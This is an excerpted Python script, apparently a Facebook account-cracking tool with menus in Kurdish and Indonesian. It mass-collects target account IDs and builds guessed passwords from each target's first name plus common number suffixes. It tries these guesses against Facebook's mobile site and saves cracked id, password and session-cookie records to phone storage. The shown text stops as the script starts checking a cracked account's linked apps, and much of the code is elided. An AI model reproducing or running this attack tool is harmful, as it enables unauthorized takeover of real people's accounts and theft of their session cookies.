...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{x}] Cookies dana :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} B SARKAFTEANA DAXLBO{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print('         —>[•] 2. Crack Followers    [ fitur √ ] ')
	print(f'         —>[•] 3. Crack Grup {m}        [ Fitur x ] ')
	print(f'{p}         —>[•] 4. Crack File         [ Fitur √ ] ')
	print('         —>[•] 5. accountet hack boyn  ')
	print(f'         —>[•] 0. darkaftn       {x}')
	print('')
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[•] 1. MARO {h}OK{x}  ')
	print(f'[•] 2. MARO {k}CP{x}  ')
	print('[•] 3. pashva zvrin	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[•] chand id de daxlke ? : '))
	except ValueError:
	...
	try:
		print('')
		print(f'[•] hack krn b reka id kon yan nwe yan  hardoka👍{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/MARO')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/MARO-1887/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/MARO--kurd/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	print(f'{x}{p}[•] 1. id kon ')
	print(f'{b}[•] 2. id nwe ')
	print(f'{hh}[•] 3. hardoka {x} {hh}[Rekomended]{x}')
	print('')
	...
	if hu in ['1','01']:
		...
		exit()
	print(f'{m}  ———————>{x}{h} METHODE CRACK {x}{m}<———————{x}') 
	print('')	
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('[•] ta dvet app dyar bkn ( Y/t ) ')
	if _jembot_ in ['']:
		print('[•] Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('[•] ta d vet pass zeda bki ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'mahamad12')
					pwv.append(frs+'mahamad123')
					pwv.append(frs+'mahamad1234')
					pwv.append(frs+'mahamad12345')
					pwv.append(frs+'mahamad123456')
					pwv.append(frs+'mahamad1234567')
					pwv.append(frs+'mahamad12345678')
					pwv.append(frs+'mahamad123456789')
					pwv.append(frs+'mahamad54321')
					pwv.append(frs+'ahmad12')
					pwv.append(frs+'ahmad123')
					pwv.append(frs+'ahmad1234')
					pwv.append(frs+'ahmad12345')
					pwv.append(frs+'ahmad123456')
					pwv.append(frs+'ahmad1234567')
					pwv.append(frs+'ahmad12345678')
					pwv.append(frs+'ahmad123456789')
					pwv.append(frs+'zanyar12')
					pwv.append(frs+'dano12345')
					pwv.append(frs+'dano1234567')
					pwv.append(frs+'kcha123')
					pwv.append(frs+'kcha1234')
					pwv.append(frs+'kcha12345')
					pwv.append(frs+'kcha123456')
					pwv.append(frs+'kcha1234567')
					pwv.append(frs+'kcha12345678')
					pwv.append(frs+'xalis1233')
					pwv.append(frs+'xalis123456')
					pwv.append(frs+'hemn123')
					pwv.append(frs+'hemn1234')
					pwv.append(frs+'hemn12345')
					pwv.append(frs+'hemn123456')
					pwv.append(frs+'hemn1234567')
					pwv.append(frs+'hemn12345678')
					pwv.append(frs+'hemn123456789')
					pwv.append(frs+'hersh1234')
					pwv.append(frs+'divan12345')
					pwv.append(frs+'sihad12345')
					pwv.append(frs+'aram123456')
					pwv.append(frs+'rayan123456')
					pwv.append(frs+'hziz123456')
					...
					pwv.append(frs+'laila1234')
					pwv.append(frs+'laila12345')
					pwv.append(frs+'laila123456')
					pwv.append(frs+'laila1234567')
					...
					pwv.append(frs+'kurds12')
					pwv.append(frs+'kurdstan')
					pwv.append(frs+'qahar1234')
					pwv.append(frs+'qahar12345')
					pwv.append(frs+'ghafar123')
					pwv.append(frs+'ghafar12')
					pwv.append(frs+'ghafar1234')
					pwv.append(frs+'ghafar12345')
					pwv.append(frs+'ghafar123456')
					pwv.append(frs+'ghafar1234567')
					pwv.append(frs+'ghafar12345678')
					pwv.append(frs+'sarbast12')
					pwv.append(frs+'sarbast123')
					pwv.append(frs+'sarbast1234')
					pwv.append(frs+'hoshang123')
					pwv.append(frs+'hoshang1234')
					pwv.append(frs+'hoshang12345')
					pwv.append(frs+'hoshang2002')
					pwv.append(frs+'hamid12345')
					pwv.append(frs+'hamid123456')
					pwv.append(frs+'jihad123')
					pwv.append(frs+'jihad1234')
					pwv.append(frs+'jihad12345')
					pwv.append(frs+'omed123')
					pwv.append(frs+'omed1234')
					pwv.append(frs+'omed12345')
					pwv.append(frs+'omed123456')
					pwv.append(frs+'omed1234567')
					pwv.append(frs+'omed12345678')
					pwv.append(frs+'star2003')
					pwv.append(frs+'star123456789')
					pwv.append(frs+'jalal123')
					pwv.append(frs+'jalal1234')
					pwv.append(frs+'jalal12345')
					pwv.append(frs+'jalal123456')
					pwv.append(frs+'jalal1234567')
					pwv.append(frs+'hogr123456789')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK SELESAI —> JANGAN LUPA BERSYUKUR MARO [cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('[•] ta d vet dobara hack bki ( Y/t ) ? ')
	woi = input('[•] halbzhera : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r MARO- {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s [•] %s/%s [!] OK:%s [+] CP:%s [-] %s%s%s MARO- '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='BAHA- CP'))
					open('/sdcard/MARO-1887/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='MARO-1887 OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/MARO-/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
